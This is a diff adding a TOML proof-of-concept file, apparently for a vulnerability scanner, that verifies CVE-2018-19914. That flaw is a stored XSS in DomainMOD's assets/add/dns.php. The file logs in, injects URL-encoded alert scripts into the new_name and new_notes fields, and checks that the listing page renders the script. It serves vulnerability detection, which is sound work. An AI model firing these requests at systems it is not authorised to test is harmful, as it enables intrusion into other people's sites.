@@ -1,0 +1,67 @@
+[info]
+author = "ave"
+description = "验证 DomainMOD 4.11.01 及之前版本中 assets/add/dns.php 页面的存储型 XSS 漏洞。攻击者登录后向 new_name 或 new_notes 字段注入恶意脚本，当其他管理员访问 assets/dns.php 列表页时脚本执行。"
+id = "POC-AVE-2018-0157"
+name = "DomainMOD 4.11.01 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2018-0157"]
+vuln_id = [
+    "CVE-2018-19914",
+    "AVE-2018-0157",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_username={{username}}&new_password={{password}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    302,
+    200,
+]
+type = "status"
+
+[[poc.requests]]
+cookie_reuse = true
+method = "POST"
+path = "/{{BaseURL}}/assets/add/dns.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_dns1=abc&new_ip1=&new_dns2=abc&new_ip2=&new_dns3=abc&new_ip3=&new_dns4=&new_ip4=&new_dns5=&new_ip5=&new_dns6=&new_ip6=&new_dns7=&new_ip7=&new_dns8=&new_ip8=&new_dns9=&new_ip9=&new_dns10=&new_ip10=&new_notes=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    302,
+    200,
+]
+type = "status"
+
+[[poc.requests]]
+cookie_reuse = true
+method = "GET"
+path = "/{{BaseURL}}/assets/dns.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["><script>alert(document.domain)</script></a>"]
